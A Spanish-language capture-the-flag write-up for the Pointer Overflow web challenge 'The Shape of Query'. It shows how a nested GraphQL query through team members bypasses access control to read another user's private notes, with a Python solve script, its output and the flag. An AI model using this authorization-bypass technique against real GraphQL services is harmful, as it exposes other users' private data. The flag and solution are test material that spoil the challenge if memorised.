
# Writeup — The Shape of Query

> **CTF:** Pointer Overflow CTF · **Categoría:** Web 300 · **Wave 1**

> **Reto:** The Shape of Query

> **Vulnerabildades explotadas:** 

> 	A01 - Broken Access Control

> 	A06 - Insecure Design

## Presentación

El evento **Pointer Overflow CTF** presenta algo de información antes de cada reto dando un poco de contexto.

```txt
# The Shape of Query

Progress relies on having the right infrastructure to foster collaboration. A frictionless system for the exchange of ideas, integrity-preserving measures, and plenty of backup. There are many platforms on the market for this. Well, I'm developing my own. It's not the best. It's not the fastest. It's not the most resilient. But it is the one that I own the IP rights for, so I'm pushing it hard. Since I have a bevy of CTF player's attention, seems like a good chance to score some free pen testing. Head over to my Collaborative Research Portal and poke around a little. I am most concerned about user security. Last thing we need is for researchers to start meddling with each others' stuff.
```

Este ejercicio se trata de una plataforma desarrollada por una persona que se preocupa por la seguridad de sus usuarios.
La consigna entrega un TOKEN de sesión para registrarse.

![[./images/Consigna.png|1000]]

![[./images/pedir_token.png|1000]]

## Reconocimiento

La página es una interfaz GraphQL con la cual se pueden obervar los datos almacenados.

La estructura se encuentra documentada en **Docs** e indica en un comentario que permite introspección.

![[./images/base.png|1200]]

### Documentación de la base de datos.

Para comenzar se analiza la documentación, los tipos de query y los campos que tienen **User** y **Team**.

![[./images/doc_1.png|500]]

Se indica en **User** que el campo `privateNotes` solo se puede acceder por el mismo usuario, es decir, yo no puedo leer las notas privadas de otros usuarios.

![[./images/doc_user.png|500]]

Se indica en **Team** que no se puede acceder a información de otros equipos a los que el usuario no pertenezca.

![[./images/doc_team.png|500]]

### Enumeración de la base de datos

Exploro los datos siguiendo la estructura mostrada en la documentación.

![[./images/datos_yo_id.png|1200]]

Se puede observar las notas privadas de mi usuario y el equipo al que pertenezco.

![[./images/datos_yo_note_team.png|1200]]

También se pueden enumerar los miembros del equipo al que pertenezco.

![[./images/datos_team_members_id.png|1200]]

## Flag

A pesar de que directamente no se pueda acceder a las notas privadas de otros usuarios, si se puede acceder a los datos de los miembros de **mi equipo**, por lo que puedo enumerar ciertos datos críticos como las **privateNotes** de **admin_1647**.

![[./images/datos_flag.png|1200]]

En las notas privadas de **admin_1647** se observa la flag.

Flag: `POCTF{81.1647.74XJQZ3BVMKVS47G.XIT6TSXWESXLCUKGQOWBHOMO5I}`

## Script.

A pesar de ser un CTF simple el script de resolución automática cuenta con varios pasos ya que debe loguearse con el token generado en la primer instancia.
Por ello primero se obtiene el token, con este se registra y se actualiza la cookie de sesión, con esta nueva cookie ya se permite acceder a la API y obtener la flag.

```python
#!/usr/bin/env python3
import json, re, requests, sys

# Configuración
GET_TOKEN    = 'https://pointeroverflowctf.com/challenges/shape-of-query/'
LOGIN_TOKEN  = 'https://shape-of-query.pointeroverflowctf.com/session/exchange'
ENDPOINT = 'https://shape-of-query.pointeroverflowctf.com/graphql'
COOKIE      = 'session=... cookie de sesion ...'

HEADERS = {"Cookie": COOKIE, "Content-Type": "application/json"}

# Payload
PAYLOAD = {"query": "{me{id,team{id,members{id,privateNotes}}}}"}

def main():
    print("PASO 1 - Obtener TOKEN")
    r = requests.get(GET_TOKEN, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error al acceder al endpoint: {r.status_code}")
        sys.exit(1)
    print(f"Acceso exitoso. Status: {r.status_code}")
    # print(f"Response: {r.text}")

    m = re.search(r'<div class="token-block">\s*([^<]+?)\s*</div>', r.text)
    token = m.group(1) if m else None
    print(f"Token: {token}")

    print("\nPASO 2 - Obtener nueva cookie para usar en el frontend")
    r = requests.post(LOGIN_TOKEN, json={"token": token}, headers=HEADERS)
    if r.status_code != 200:
        print(f"Error al enviar el token: {r.status_code}")
        sys.exit(1)
    # print(f"Token enviado exitosamente. Status: {r.status_code}")
    # print(f"Response: {r.text}")

    new_cookie = r.headers.get("Set-Cookie")
    if not new_cookie:
        print("No se recibió nueva cookie de sesión.")
        sys.exit(1)
    print(f"New cookie: {new_cookie}")
    HEADERS["Cookie"] = new_cookie

    print("\nPASO 3 - Enviar consulta GraphQL para obtener la flag")

    r = requests.post(ENDPOINT, headers=HEADERS, json=PAYLOAD)
    if r.status_code != 200:
        print(f"Error al enviar la consulta: {r.status_code}")
        sys.exit(1)
    print(f"Consulta enviada exitosamente. Status: {r.status_code}\n")
    # print(f"Response: \n{json.dumps(r.json(), indent=4)}")

    flag = r.json().get("data", {}).get("me", {}).get("team", {}).get("members", [])[1].get("privateNotes", "")
    if flag:
        print(f"Flag encontrada: {flag}")
    else:
        print("No se encontró la flag en la respuesta.")

if __name__ == "__main__":
    main()

```

## Resultado.

Resultado obtenido al ejecutar el script.

```bash
$ python3 ./solve.py
PASO 1 - Obtener TOKEN
Acceso exitoso. Status: 200
Token: SHAPE1.1647.81.74XJQZ3BVMKVS47G.1794170115.EMCUOTGMX3NOEAHLWXN7KAC5TM

PASO 2 - Obtener nueva cookie para usar en el frontend
New cookie: session=eyJjaWQiOjgxLCJub25jZSI6Ijc0WEpRWjNCVk1LVlM0N0ciLCJ0ZWFtX2lkIjoxNjQ3fQ.avDZgA.rzw9kBFMeH2dqk7gUZZ5fbmgl00; HttpOnly; Path=/; SameSite=Lax

PASO 3 - Enviar consulta GraphQL para obtener la flag
Consulta enviada exitosamente. Status: 200

Flag encontrada: POCTF{81.1647.74XJQZ3BVMKVS47G.XIT6TSXWESXLCUKGQOWBHOMO5I}
```

